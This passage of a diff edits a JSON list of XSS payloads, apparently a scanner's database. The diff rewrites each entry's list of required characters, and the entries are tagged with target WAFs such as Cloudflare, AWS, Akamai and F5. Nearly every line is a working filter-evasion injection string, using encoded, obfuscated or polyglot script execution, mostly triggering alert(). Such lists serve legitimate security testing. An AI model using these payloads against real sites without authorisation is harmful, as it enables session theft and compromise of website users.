     "level": "critical"
   },
   {
     "Payload": "<script>Function`a${'alert(1)'}b`()</script>",
     "Attribute": [
-      "<",
-      ">",
-      "`",
-      "$",
+      "/",
       "{",
-      "}",
       "'",
+      ")",
       "(",
-      ")"
+      ">",
+      "<",
+      "}"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Function template literal injection",
     "level": "critical"
   },
   {
     "Payload": "<svg><animateTransform attributeName=transform type=rotate values='0;alert(1);0' dur=1s>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
       "'",
       ";",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG animateTransform XSS",
     "level": "high"
   },
   {
     "Payload": "<img src=x:alert(1) onerror=eval(src)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      ":",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Image src protocol with eval",
     "level": "critical"
   },
   {
     "Payload": "<svg><set attributeName=onmouseover to=alert(1)>",
     "Attribute": [
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG set element XSS",
     "level": "medium"
   },
   {
     "Payload": "<style>body{background:url('javascript:alert(1)')}</style>",
     "Attribute": [
-      "<",
-      ">",
+      "/",
       "{",
-      "}",
-      "(",
-      ")",
       "'",
-      ":"
+      ")",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "CSS background JavaScript URL",
     "level": "high"
   },
   {
     "Payload": "<script>with(document)with(body)innerHTML=outerHTML</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
-      "="
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Double with statement XSS",
     "level": "critical"
   },
   {
     "Payload": "<script>for(i in window)if(/^a/.test(i)&&/t$/.test(i))window[i]('XSS')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "[",
-      "]",
       "/",
-      "^",
-      "$",
-      "&",
-      "'"
+      "]",
+      ")",
+      "'",
+      "(",
+      ">",
+      "<",
+      "["
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Window property iteration to find alert",
     "level": "critical"
   },
   {
     "Payload": "<math><msup><mi>x</mi><menclose notation=\"top\"><maligngroup><malignmark/><mglyph><menclose><mglyph><mi>x</mi><menclose notation=\"bottom\"><mtext style=\"background:xss;-moz-background-clip:border;-moz-background-origin:border;-moz-background-size:auto auto;-moz-background-attachment:scroll;-moz-background-color:rgb(255,0,0);-moz-background-image:url(javascript:alert('XSS'));-moz-background-position:0% 0%;-moz-background-repeat:repeat;\">XSS</mtext>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
+      "\"",
       ")",
       ";",
-      ":",
-      "/",
       "'",
-      "\"",
-      "%"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "MathML with CSS background-image JavaScript execution",
     "level": "critical"
   },
   {
     "Payload": "<svg/onload=location=`javascript:`+atob`YWxlcnQoJ1hTUycpOw``>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "`",
-      "(",
-      ")",
-      "'"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "SVG with base64 encoded JavaScript payload",
     "level": "critical"
   },
   {
     "Payload": "<iframe/srcdoc=\"&lt;img src=x onerror=alert&lpar;'XSS'&rpar;&gt;\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "&",
+      "'",
       ";",
-      "(",
-      ")",
-      "'"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Iframe with HTML entity encoded XSS payload",
     "level": "critical"
   },
   {
     "Payload": "<details/open/ontoggle=\"location='\\u006aav\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:\\u0061\\u006c\\u0065\\u0072\\u0074(1)'\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
       "'",
-      "(",
       ")",
-      "\\"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Details element with Unicode escaped JavaScript",
     "level": "critical"
   },
   {
     "Payload": "<script>globalThis[`al`+`ert`](String.fromCharCode(88,83,83))</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "[",
+      "/",
       "]",
-      "`",
-      "+",
-      "."
+      ")",
+      "(",
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "ES2020 globalThis with template literals and char codes",
     "level": "critical"
   },
   {
     "Payload": "<style>@import url(\"data:text/css;base64,Ym9keXtiYWNrZ3JvdW5kOnVybCgiamF2YXNjcmlwdDphbGVydCgnWFNTJykiKX0=\");</style>",
     "Attribute": [
-      "<",
-      ">",
-      "@",
-      "(",
-      ")",
-      "\"",
-      ":",
-      ";",
       "/",
-      "+",
-      "="
+      "\"",
+      ")",
+      ";",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "CSS @import with base64 data URI JavaScript",
     "level": "critical"
   },
   {
     "Payload": "<marquee/onstart=new(Error.c/**/onstructor.c/**/onstructor)('al\\x65rt(\"XSS\")')()>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "(",
-      ")",
-      ".",
-      "*",
-      "\\",
       "\"",
-      "'"
+      "'",
+      ")",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Marquee with constructor chain and hex escaping",
     "level": "critical"
   },
   {
     "Payload": "<object/data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      ":",
       ";",
-      "+"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Object with base64 HTML data URI containing script",
     "level": "critical"
   },
   {
     "Payload": "<input/onfocus=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) autofocus>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "(",
       ")",
-      "."
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Input with eval and fromCharCode encoding",
     "level": "critical"
   },
   {
     "Payload": "<form><button/formaction=\"javascript&colon;alert&lpar;'XSS'&rpar;\">XSS</button></form>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "&",
+      "'",
       ";",
-      "(",
-      ")",
-      "'"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Form button with HTML entity encoded JavaScript URL",
     "level": "critical"
   },
   {
     "Payload": "<video><source/onerror=\"[].constructor.constructor('alert(1)')()\" src=\"//\"></video>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "\"",
-      "[",
       "]",
-      ".",
-      "(",
+      "\"",
+      "'",
       ")",
-      "'"
+      "(",
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Video source with Array constructor to Function constructor",
     "level": "critical"
   },
   {
     "Payload": "<meter/onmouseover=\"new%20Function%28%60alert%281%29%60%29%28%29\" value=1 max=1>",
     "Attribute": [
-      "<",
-      ">",
-      "/",
-      "=",
       "\"",
-      "%",
-      "(",
-      ")",
-      "`"
+      "/",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Meter with URL encoded Function constructor and template literals",
     "level": "critical"
   },
   {
     "Payload": "<canvas/id=\"xss\" onmousemove=\"eval(document.getElementById('xss').getAttribute('data-payload'))\" data-payload=\"alert('XSS')\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "(",
-      ")",
       "'",
-      "."
+      ")",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Canvas with payload stored in data attribute",
     "level": "critical"
   },
   {
     "Payload": "<base/href=\"javascript://&Tab;alert('XSS')//\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      ":",
-      "&",
+      "'",
       ";",
-      "(",
       ")",
-      "'"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Base tag with tab character in JavaScript URI",
     "level": "critical"
   },
   {
     "Payload": "<template><svg/onload=eval(atob(this.parentElement.firstElementChild.getAttribute('data-xss')))></template><script>document.querySelector('template').setAttribute('data-xss',btoa('alert(1)'))</script>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "(",
+      "'",
       ")",
-      ".",
-      "'"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Template with dynamically set base64 payload",
     "level": "critical"
   },
   {
     "Payload": "<xmp><script>alert('XSS')</script></xmp>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
-      "'"
+      "'",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "XMP tag attempting script execution (context dependent)",
     "level": "medium"
   },
   {
     "Payload": "<audio/ontimeupdate=\"[...`${alert}`][0]`1`\" controls>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "\"",
-      "[",
       "]",
-      ".",
-      "`",
-      "$",
+      "\"",
       "{",
-      "}",
-      "(",
-      ")"
+      ">",
+      "[",
+      "<",
+      "}"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Audio with spread operator and template literal execution",
     "level": "critical"
   },
   {
     "Payload": "<embed/src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCdYU1MnKSI+PC9zdmc+\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      ":",
       ";",
-      "+"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Embed with base64 SVG containing onload XSS",
     "level": "critical"
   },
   {
     "Payload": "<link/rel=\"import\" href=\"data:text/html,<script>alert('XSS')</script>\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      ":",
-      ",",
-      "(",
+      "'",
       ")",
-      "'"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "HTML Import with inline script (deprecated but may work)",
     "level": "medium"
   },
   {
     "Payload": "<isindex/type=image formaction=\"javascript&colon;alert&lpar;1&rpar;\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "&",
       ";",
-      "(",
-      ")"
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Isindex with form action JavaScript URL",
     "level": "medium"
   },
   {
     "Payload": "<map><area/href=\"javascript:void(window['al'+'ert'](1))\" shape=\"default\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "\"",
-      ":",
-      "(",
-      ")",
-      "[",
       "]",
+      "\"",
       "'",
-      "+"
+      ")",
+      "(",
+      ">",
+      "<",
+      "["
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Image map area with string concatenation in JavaScript URL",
     "level": "high"
   },
   {
     "Payload": "<optgroup/onmousedown=\"&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "&",
-      "#",
-      "x",
-      ";"
+      ";",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Optgroup with hex entity encoded JavaScript",
     "level": "high"
   },
   {
     "Payload": "<legend/draggable=\"true\" ondragstart=\"eval(unescape('%61%6c%65%72%74%28%31%29'))\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "(",
+      "'",
       ")",
-      "%"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Legend with drag event and URL encoded payload",
     "level": "high"
   },
   {
     "Payload": "<track/kind=\"captions\" onerror=\"self['ev'+'al']('al'+'ert(1)')\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "\"",
-      "[",
       "]",
+      "\"",
       "'",
-      "+",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Track element with self reference and string concatenation",
     "level": "high"
   },
   {
     "Payload": "<dialog/oncancel=\"new self.Function('alert(1)')()\" open>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "(",
+      "'",
       ")",
-      ".",
-      "'"
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Dialog with cancel event and Function constructor",
     "level": "high"
   },
   {
     "Payload": "<picture><source/media=\"(min-width:1px)\" srcset=\"data:image/svg+xml,<svg onload='alert(1)'></svg>\"></picture>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
       "\"",
-      "(",
       ")",
-      ":",
-      ",",
-      "'"
+      "'",
+      "(",
+      ">",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Picture source with SVG data URI in srcset",
     "level": "high"
   },
   {
     "Payload": "<slot/onfocus=\"top[String.fromCharCode(97,108,101,114,116)](1)\" tabindex=1 autofocus>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "\"",
-      "[",
       "]",
-      "(",
+      "\"",
       ")",
-      ".",
-      ","
+      "(",
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Slot with top window reference and character codes",
     "level": "high"
   },
   {
     "Payload": "<ruby><rt/onpointerdown=\"parent['Function']('alert(1)')()\" style=\"position:absolute;top:0;left:0;width:100%;height:100%\">",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "\"",
-      "[",
       "]",
+      "\"",
       "'",
-      "(",
       ")",
-      ":",
       ";",
-      "%"
+      "(",
+      ">",
+      "[",
+      "<"
     ],
-    "count": 0,
     "waf": null,
+    "count": 0,
     "description": "Ruby annotation with pointer event and parent reference",
     "level": "high"
   },
   {
     "Payload": "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "(",
       ")",
-      ","
+      "(",
+      ">",
+      "<"
     ],
     "waf": "cloudflare",
     "count": 0,
@@ -1847,13 +1891,11 @@
   {
     "Payload": "<img src=x onerror=Function('r','e','t','u','r','n',' ','a','l','e','r','t')()('XSS')>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
       ")",
       "'",
-      ","
+      "(",
+      ">",
+      "<"
     ],
     "waf": "cloudflare",
     "count": 0,
@@ -1863,18 +1905,10 @@
   {
     "Payload": "<iframe srcdoc=\"&lt;svg onload&equals;self&lbrack;&apos;ale&apos;&plus;&apos;rt&apos;&rbrack;&lpar;&apos;XSS&apos;&rpar;&gt;\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
       "\"",
-      "&",
+      ">",
       ";",
-      "[",
-      "]",
-      "+",
-      "(",
-      ")",
-      "'"
+      "<"
     ],
     "waf": "cloudflare",
     "count": 0,
@@ -1884,12 +1918,12 @@
   {
     "Payload": "<svg><script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
       "'",
-      "="
+      "(",
+      ">",
+      "<"
     ],
     "waf": "aws",
     "count": 0,
@@ -1899,14 +1933,13 @@
   {
     "Payload": "<img src=1 onerror=window[atob('ZXZhbA==')](atob('YWxlcnQoMSk='))>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "[",
       "]",
-      "(",
       ")",
-      "'"
+      "'",
+      "(",
+      ">",
+      "[",
+      "<"
     ],
     "waf": "aws",
     "count": 0,
@@ -1916,15 +1949,12 @@
   {
     "Payload": "<svg/onload=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')>",
     "Attribute": [
-      "<",
-      ">",
       "/",
-      "=",
-      "(",
       ")",
       "'",
-      "\\",
-      "x"
+      "(",
+      ">",
+      "<"
     ],
     "waf": "akamai",
     "count": 0,
@@ -1934,16 +1964,13 @@
   {
     "Payload": "<img src=x onerror=self['\\u0065\\u0076\\u0061\\u006c']('\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029')>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "[",
       "]",
       "'",
-      "\\",
-      "u",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
     "waf": "akamai",
     "count": 0,
@@ -1953,13 +1980,13 @@
   {
     "Payload": "<svg><script>setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},1)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      ","
+      ")",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": "modsecurity",
     "count": 0,
@@ -1969,14 +1996,12 @@
   {
     "Payload": "<img src=x onerror=this[String.fromCharCode(99,111,110,115,116,114,117,99,116,111,114)](String.fromCharCode(97,108,101,114,116,40,49,41))()>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "[",
       "]",
-      "(",
       ")",
-      ","
+      "(",
+      ">",
+      "[",
+      "<"
     ],
     "waf": "modsecurity",
     "count": 0,
@@ -1986,13 +2011,13 @@
   {
     "Payload": "<svg><script>top[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
     "Attribute": [
-      "<",
+      "/",
+      "]",
+      ")",
+      "(",
       ">",
       "[",
-      "]",
-      "(",
-      ")",
-      ","
+      "<"
     ],
     "waf": "incapsula",
     "count": 0,
@@ -2002,16 +2027,14 @@
   {
     "Payload": "<iframe src=\"data:text/html,<script>parent[String.fromCharCode(97,108,101,114,116)](1)</script>\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "\"",
-      ":",
-      ",",
-      "[",
+      "/",
       "]",
+      "\"",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
     "waf": "incapsula",
     "count": 0,
@@ -2021,12 +2044,12 @@
   {
     "Payload": "<svg><script>Function('ale'+'rt(1)')()</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
       "'",
-      "+"
+      "(",
+      ">",
+      "<"
     ],
     "waf": "f5",
     "count": 0,
@@ -2036,15 +2059,13 @@
   {
     "Payload": "<img src=x onerror=window['ev'+'al']('al'+'ert(1)')>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "[",
       "]",
       "'",
-      "+",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
     "waf": "f5",
     "count": 0,
@@ -2054,15 +2075,14 @@
   {
     "Payload": "<svg><script>self['\\u0065val']('\\u0061lert(1)')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "[",
+      "/",
       "]",
       "'",
-      "\\",
-      "u",
+      ")",
       "(",
-      ")"
+      ">",
+      "[",
+      "<"
     ],
     "waf": "barracuda",
     "count": 0,
@@ -2072,42 +2092,13 @@
   {
     "Payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",
     "Attribute": [
-      "j",
-      "a",
-      "V",
-      "s",
-      "C",
-      "r",
-      "i",
-      "p",
-      "t",
-      ":",
       "/",
-      "*",
-      "-",
-      "`",
-      "\\",
-      "'",
       "\"",
-      "(",
+      "'",
       ")",
-      "=",
-      "%",
-      "0",
-      "D",
-      "A",
-      "d",
-      "<",
+      "(",
       ">",
-      "!",
-      "x",
-      "3",
-      "c",
-      "S",
-      "g",
-      "N",
-      "l",
-      "o"
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2117,13 +2108,13 @@
   {
     "Payload": "'\">><marquee><img src=x onerror=confirm(1)></marquee>\" onmouseover=prompt(1) onclick=alert(1)>",
     "Attribute": [
-      "'",
+      "/",
       "\"",
-      ">",
-      "<",
-      "=",
+      "'",
+      ")",
       "(",
-      ")"
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2133,29 +2124,15 @@
   {
     "Payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
     "Attribute": [
-      "j",
-      "a",
-      "v",
-      "s",
-      "c",
-      "r",
-      "i",
-      "p",
-      "t",
-      ":",
       "/",
-      "*",
-      "-",
-      ">",
-      "<",
+      "]",
       "\"",
       "'",
-      "+",
-      "[",
-      "]",
-      "(",
       ")",
-      "="
+      "(",
+      ">",
+      "<",
+      "["
     ],
     "waf": null,
     "count": 0,
@@ -2165,18 +2142,15 @@
   {
     "Payload": "<svg><script>(_=>[_+_][+_]+[_+_+''][+_]+'r'+(![]+_)[+!+_+!+_+!+_]+(![]+_)[+!+_+!+_]+'('+(+_+'')[+_]+')'+'')()&amp;&amp;alert(1)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "=",
-      "[",
+      "/",
       "]",
-      "+",
-      "_",
       "'",
-      "!",
-      "&"
+      ")",
+      ";",
+      "(",
+      ">",
+      "[",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2186,13 +2160,11 @@
   {
     "Payload": "<img src=x onerror=\"eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,97,40,41,123,97,108,101,114,116,40,49,41,125,97,40,41))\">",
     "Attribute": [
-      "<",
-      ">",
-      "=",
       "\"",
-      "(",
       ")",
-      ","
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2202,24 +2174,12 @@
   {
     "Payload": "<svg><script>eval(unescape('%66%75%6e%63%74%69%6f%6e%20%61%28%29%7b%61%6c%65%72%74%28%31%29%7d%61%28%29'))</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
-      "%",
-      "6",
-      "5",
-      "c",
-      "8",
-      "1",
-      "2",
-      "f",
-      "3",
-      "4",
-      "a",
-      "7",
-      "b",
-      "d"
+      "'",
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2229,12 +2189,10 @@
   {
     "Payload": "#<img src=x onerror=alert(1)>",
     "Attribute": [
-      "#",
-      "<",
+      ")",
       ">",
-      "=",
-      "(",
-      ")"
+      "<",
+      "("
     ],
     "waf": null,
     "count": 0,
@@ -2244,20 +2202,9 @@
   {
     "Payload": "javascript:void(0);alert(String.fromCharCode(88,83,83))",
     "Attribute": [
-      "j",
-      "a",
-      "v",
-      "s",
-      "c",
-      "r",
-      "i",
-      "p",
-      "t",
-      ":",
-      "(",
       ")",
       ";",
-      ","
+      "("
     ],
     "waf": null,
     "count": 0,
@@ -2267,17 +2214,11 @@
   {
     "Payload": "data:text/html,<script>alert(opener?opener.document.domain:document.domain)</script>",
     "Attribute": [
-      "d",
-      "a",
-      "t",
-      ":",
       "/",
-      "<",
-      ">",
-      "(",
       ")",
-      "?",
-      "."
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2287,16 +2228,12 @@
   {
     "Payload": "<script>navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\\'message\\',e=>eval(e.data))')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "'",
-      ".",
-      ",",
-      "=",
+      ")",
+      "(",
       ">",
-      "\\"
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2306,15 +2243,13 @@
   {
     "Payload": "<script>WebAssembly.instantiateStreaming(fetch('data:application/wasm;base64,AGFzbQEAAAA=')).then(m=>m.instance.exports.alert())</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      ".",
-      "=",
+      "/",
       "'",
       ";",
-      ","
+      ")",
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2324,15 +2259,15 @@
   {
     "Payload": "<style>@supports (display: flex) { body::after { content: '}\\A alert(1)//'; } }</style>",
     "Attribute": [
+      "/",
       "{",
-      "}",
-      "(",
       ")",
-      ":",
-      ";",
       "'",
-      "\\",
-      "/"
+      ";",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2342,18 +2277,16 @@
   {
     "Payload": "<script>new Proxy({},{get:(t,p)=>p=='valueOf'?()=>alert(1):t[p]})+''</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
+      "]",
       "{",
-      "}",
-      ":",
-      "=",
-      ">",
-      "?",
+      ")",
       "'",
-      "+"
+      "(",
+      ">",
+      "<",
+      "[",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2363,19 +2296,16 @@
   {
     "Payload": "<script>({[Symbol.toPrimitive]:()=>alert(1)})+''</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "{",
-      "}",
-      "[",
+      "/",
       "]",
-      ":",
-      "=",
+      "{",
+      ")",
+      "'",
+      "(",
       ">",
-      "+",
-      "'"
+      "[",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2385,16 +2315,15 @@
   {
     "Payload": "<script>try{new SharedArrayBuffer(1);postMessage({cmd:'eval',code:'alert(1)'},'*')}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
+      ")",
+      ";",
       "'",
-      ":",
-      ",",
-      "*"
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2404,14 +2333,13 @@
   {
     "Payload": "<canvas id=c><script>c.getContext('webgl').shaderSource(c.getContext('webgl').createShader(35633),'alert(1)');alert(1)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
+      "/",
       ")",
       "'",
-      ".",
-      ";"
+      ";",
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2421,17 +2349,15 @@
   {
     "Payload": "<style>div{background:paint(--xss);}@supports (background:paint(foo)){--xss:url('javascript:alert(1)')}</style><div>",
     "Attribute": [
-      "<",
-      ">",
+      "/",
       "{",
-      "}",
-      ":",
-      ";",
-      "(",
       ")",
-      "-",
+      ";",
       "'",
-      "="
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2441,13 +2367,11 @@
   {
     "Payload": "<script>eval(String.raw`\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029`)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
+      "/",
       ")",
-      "`",
-      "\\",
-      "u"
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2457,16 +2381,13 @@
   {
     "Payload": "<script>BigInt.prototype.valueOf=_=>alert(1);BigInt(0)+''</script>",
     "Attribute": [
-      "<",
-      ">",
-      ".",
-      "=",
-      "_",
-      ">",
-      "(",
+      "/",
       ")",
-      "+",
-      "'"
+      ";",
+      "'",
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2476,13 +2397,13 @@
   {
     "Payload": "<script>try{Atomics.store(new Int32Array(new SharedArrayBuffer(4)),0,alert(1))}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
+      "/",
       "{",
-      "}",
-      ","
+      ")",
+      "(",
+      ">",
+      "<",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2492,13 +2413,13 @@
   {
     "Payload": "<div id=x><script>new ResizeObserver(()=>alert(1)).observe(x);x.style.width='1px'</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
+      "/",
       ")",
-      ".",
-      "'"
+      ";",
+      "'",
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2508,12 +2429,11 @@
   {
     "Payload": "<div id=x><script>new IntersectionObserver(()=>alert(1)).observe(x)</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
+      "/",
       ")",
-      "."
+      "(",
+      ">",
+      "<"
     ],
     "waf": null,
     "count": 0,
@@ -2523,18 +2443,17 @@
   {
     "Payload": "<script>new PerformanceObserver(()=>alert(1)).observe({entryTypes:['mark']});performance.mark('x')</script>",
     "Attribute": [
-      "<",
-      ">",
-      "(",
-      ")",
-      "=",
-      ">",
-      "{",
-      "}",
-      "[",
+      "/",
       "]",
+      "{",
+      ")",
       "'",
-      "."
+      ";",
+      "(",
+      ">",
+      "<",
+      "[",
+      "}"
     ],
     "waf": null,
     "count": 0,
@@ -2544,18 +2463,16 @@
   {
     "Payload": "<div id=x><script>try{x.attributeStyleMap.set('--xss',CSS.unparsedValue(['alert(1)']))}catch(e){alert(1)}</script>",
     "Attribute": [
-      "<",
-      ">",
-      "=",
-      "(",
-      ")",
-      "{",
-      "}",
